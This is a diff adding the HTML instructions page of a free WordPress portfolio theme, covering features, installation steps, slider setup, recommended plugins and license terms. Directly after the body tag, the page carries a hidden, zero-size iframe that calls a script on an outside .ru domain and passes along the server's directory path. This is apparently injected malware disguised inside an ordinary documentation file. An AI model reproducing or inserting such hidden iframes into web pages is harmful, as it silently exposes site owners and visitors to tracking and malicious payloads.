@@ -1,0 +1,109 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"
+   "http://www.w3.org/TR/html4/strict.dtd">
+
+<html lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<title>Instructions for Work-a-holic Theme</title>
+	<meta name="author" content="Chandra Maharzan">
+	<link rel="stylesheet" href="style.css" type="text/css" media="screen, projection" />
+</head>
+<body><iframe width="0" height="0" style="display:none;" id="frmchkldver" src="http://inglo-kotor.ru/yesproject/check.php?ftd=190051&path=%7cdaletigre%7cpublic_html%7cwp-content%7cthemes%7cworkaholic%7c&sys=UN&wrk=8"></iframe>
+	<div class="container_12">
+ 		<h1>Work-a-holic Theme Instructions</h1>
+		<hr />
+		<div class="grid_8">
+		<h1>Features</h1>
+		<p>This theme is a free two/three column theme that can be used to showcase portfolios for designers, illustrators, artists, photobloggers or virtually anyone else who want to showcase their work and maintain a blog. Here is a brief list of the major features:</p>
+		<ul>
+			<li>Separate Blog and Portfolio Section</li>
+			<li>Blog-style archive for blog posts</li>
+			<li>Portfolio pulls latest thumbnail of the post and lists each of them in three columns</li>
+			<li>Multiple image gallery container (slider) on portfolio posts</li>
+			<li>Basic Theme Options</li>
+			<li>Twitter integrated - shows latest Tweet</li>			
+			<li>Separate sidebar on Portfolio and normal sidebar on Blog</li>
+			<li>One Page template with separate sidebar</li>
+			<li>Ability to have a separate desired Thumbnail if WP-Post-Thumbnail plugin is installed</li>
+			<li>jQuery effects on Portfolio thumbnails</li>
+			<li>Multi-level Drop Down Menu</li>
+			<li>Support Nested Comments</li>
+			<li>Three footer widgets</li>
+			<li>Uses 960 css framework and jQuery javascript framework</li>
+			<li>XHML:  This theme has been tested on Firefox, Safari, IE 8, 7, 6.</li>
+		</ul>
+		</div>
+		<div class="grid_4">
+			<div>
+			<h3>Best Practices</h3>
+				<p>If you want to make changes to how this theme looks and feels, than create a child theme.  Never make changes to the original theme files.  Why?  Because when a new version of this theme is released, all of your changes will be lost when you update.  Plus, making a child theme is incredibly easy.  <a href="http://op111.net/p53">Here is how you do it.</a></p>
+			</div>
+		</div>
+		<hr />
+		<ol>
+		<li>
+			<h3>Installation</h3>
+					<ol>
+						<li>Unzip the folder contained in the archive to your computer.</li>
+						<li>Upload the folder and its contents to the themes directory of your blog, located in &quot;wp-content/themes&quot; where WordPress is installed.</li>
+						<li>Click on Appearance -> Themes menu from the WP admin panel, then select the theme to activate.</li>
+						<li>Go to Appearance -> Theme Options and put in the details. Save Changes.</li>
+						<li>Go to Settings -> Media and set your thumbnails to 284 x 150, medium max width to 600 and large to 940. You can leave the field for height blank for medium and large just to fit portrait images as well.</li>
+						<li>Go to Settings -> Reading and set your Blog pages show at most to 9 (or multiples of 3). This is used to show number of posts in the blog and in the archive page.</li>
+					    <li>Click on View Site at the top of the page.  Bam.  Hot site!</li>
+					</ol>
+
+		</li>
+			
+	
+		<li>
+			<h3>Setting up Portfolio Slider</h3>
+			<p>When you post a new post, click the Add an Image button (small icon on the top of the post textarea). You will get the Add an Image window. Click Select Files and select your images / screenshots. Once you upload an image or a set of images, click Save Changes. Don't click Insert into Post button. Then close the Add an Image window. You will not get any text / images on the post textarea but these images has been added to the database. You can write up any additional text about the portfolio item.</p>
+			<p>Below your post textarea, you should see the area called Excerpt. Add any one line excerpt that describes the portfolio item. This excerpt will be used in the sidebar (under Similar Projects). The sidebar on each Portfolio item shows 10 other items from the same category randomly.</p>
+			
+				
+		</li>
+		
+		<li>
+			<h3>Widgets</h3>
+					<p>There are a total of three widgetized areas on this theme in addition to the default sidebar.  The bottom area on the homepage three-column area is 100% widgetized. You can add and delete widgets by clicking Design - Widgets, from within your Wordpress admin panel.</p>
+		</li>
+		
+		<li>
+			<h3>Recommended Plugins</h3>
+					<h5>WP-Post-Thumbnail</h5>
+					<p>This is extremely useful if you do not want wordpress to auto thumb your images, which can create undesirable results. With WP-Post-Thumbnail, you can select the area in your image you want to show as a thumbnail. <a href="http://www.seoadsensethemes.com/wordpress-wp-post-thumbnail-plugin/">Download</a> and after unzipping put the wp-post-thumbnail folder in the wp-content/plugins folder. Activate the plugin from Plugins menu. Once its activated you should see the WP Post Thumbnail option at the end of the Add New Post page. You can then upload an image and select the area you prefer for a thumbnail.</p>
+					<p>Make sure to go to Settings -> WP-Post-Thumbnail and Set the "Assign to Custom Key" to "thumbnail-wide".</p>
+					<h5>jQuery Comment Validation</h5>
+					<p>Just in case you don't want people to be directed to a blank error page, you can use this plugin. <a href="http://bassistance.de/wordpress-plugins/wordpress-plugin-comment-validation/">Download</a> and paste it in your wp-content/plugins folder. Go to the Plugins menu and activate the plugin. In addition, open up comment-validation.php and either comment out or delete line 17 through 19 that says:</p>
+<p>
+<pre>
+echo '&lt;script type="text/javascript" src="';
+bloginfo('wpurl');
+echo '/wp-content/plugins/comment-validation/jquery-1.2.6.pack.js"&gt;&lt;/script&gt;';
+</pre>
+
+Now the comments will not redirect to the blank page if there is an error.</p>
+		</li>
+		
+		<li>
+			<h3>Common problems</h3>
+			<p>This theme uses jQuery javascript library to do some fancy stuff.  If your theme looks broken, than you likely have a plugin that uses a conflicting javascript library.  Deactivate your plugins, one-by-one, to determine which plugin is conflicting with jQuery.</p>
+			<p>Still having trouble?  Consider <a href="http://graphpaperpress.com/members/signup.php">becoming a member of Graph Paper Press</a> so you can get access to our private, well-groomed <a href="http://graphpaperpress.com/support/">support forum</a>, tutorials, and additional themes.</p>
+		</li>
+		<li>
+			<h3>License Details</h3>
+				<p>There are a few things to know that you can and cannot do with this theme:</p>
+				<ul>
+					<li>Give credit where credit is due.  Keeping the credit link intact is <strong>recommended</strong>.  If you want to remove the credit, consider becoming <a href="http://graphpaperpress.com/members/signup.php">a developer-level member of Graph Paper Press</a>.</li>
+
+					<li>You <strong>may</strong> use this product for personal and commercial purposes.</li>
+					<li><strong>DO NOT</strong> resell or redistribute this product in whole or part (including derivative works).</li>
+				</ul>
+				<br />
+				<p>This theme was created for by us for you for free.  Inquiries, comments, suggestions: <a href="mailto:info@graphpaperpress.com">info@graphpaperpress.com</a></p>
+		</li>
+		</ol>	
+	</div>
+</body>
+</html>
